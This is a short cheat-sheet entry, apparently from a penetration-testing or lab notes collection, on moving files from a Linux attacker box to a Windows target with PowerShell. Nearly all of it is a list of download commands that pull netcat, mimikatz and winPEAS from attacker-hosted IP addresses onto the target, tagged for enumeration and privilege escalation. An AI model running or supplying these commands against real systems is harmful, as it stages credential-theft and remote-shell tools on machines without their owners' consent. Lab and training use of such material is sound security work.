---
title: |
  File Transfers - Linux to Windows - Powershell
description: |
  Powershell Commands:

  	powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.17/nc.exe','c:\temp\nc.exe')

  	powershell.exe -c (Start-BitsTransfer -Source "http://10.10.14.17/nc.exe -Destination C:\temp\nc.exe")

  	powershell.exe wget "http://10.10.14.17/nc.exe" -outfile "c:\temp\nc.exe"

  	Invoke-WebRequest -Uri http://10.10.14.186/mimikatz.exe -OutFile mimikatz.exe

  	curl http://10.10.14.17/winPEASx64.exe -o winpeas.exe

  	iwr http://192.168.119.203/test.pdf -OutFile test.pdf

command: |
  See commands.
items:
  - Shell
OS:
  - Windows
attack_types:
  - Enumeration
  - PrivEsc
references:
  - https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration
  - https://isroot.nl/2018/07/09/post-exploitation-file-transfers-on-windows-the-manual-way/
---
